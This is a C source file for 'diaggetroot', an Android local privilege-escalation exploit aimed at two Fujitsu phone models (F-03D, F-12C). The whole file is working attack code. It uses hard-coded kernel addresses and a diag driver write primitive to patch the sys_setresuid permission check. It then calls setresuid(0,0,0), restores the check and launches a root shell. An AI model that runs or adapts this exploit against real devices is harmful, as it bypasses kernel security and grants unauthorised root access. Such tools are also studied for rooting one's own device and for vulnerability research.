/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/system_properties.h>

#include "diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int sys_setresuid_check_address;
  unsigned long int delayed_rsp_id_address;
} supported_device;

supported_device supported_devices[] = {
  { "F-03D", "V24R33Cc", 0xc00e83ce, 0xc0777dd0 },
  { "F-12C", "V21",      0xc00e5ad2, 0xc075aca4 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
detect_injection_addresses(diag_injection_addresses *injection_addresses)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      injection_addresses->target_address =
        supported_devices[i].sys_setresuid_check_address;
      injection_addresses->delayed_rsp_id_address =
        supported_devices[i].delayed_rsp_id_address;
        return true;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return false;
}

static bool
inject_command(const char *command,
               diag_injection_addresses *injection_addresses)
{
  struct values injection_data;

  injection_data.address = injection_addresses->target_address;
  injection_data.value = command[0] | (command[1] << 8);

  return inject(&injection_data, 1,
                injection_addresses->delayed_rsp_id_address) == 0;
}

static bool
break_sys_setresuid(diag_injection_addresses *injection_addresses)
{
  const char beq[] = { 0x00, 0x0a };
  return inject_command(beq, injection_addresses);
}

static bool
restore_sys_setresuid(diag_injection_addresses *injection_addresses)
{
  const char bne[] = { 0x00, 0x1a };
  return inject_command(bne, injection_addresses);
}

static void
usage(void)
{
  printf("Usage:\n");
  printf("\tdiaggetroot [sys_setresuid_address] [delayed_rsp_id address]\n");
}

int
main(int argc, char **argv)
{
  int ret;
  diag_injection_addresses injection_addresses;

  if (argc != 3) {
    if (!detect_injection_addresses(&injection_addresses)) {
      usage();
      exit(EXIT_FAILURE);
    }
  } else {
    injection_addresses.target_address = strtoul(argv[1], NULL, 16);
    injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
  }

  ret = break_sys_setresuid(&injection_addresses);
  if (ret < 0) {
    exit(EXIT_FAILURE);
  }

  ret = setresuid(0, 0, 0);
  restore_sys_setresuid(&injection_addresses);

  if (ret < 0) {
    printf("failed to get root access\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
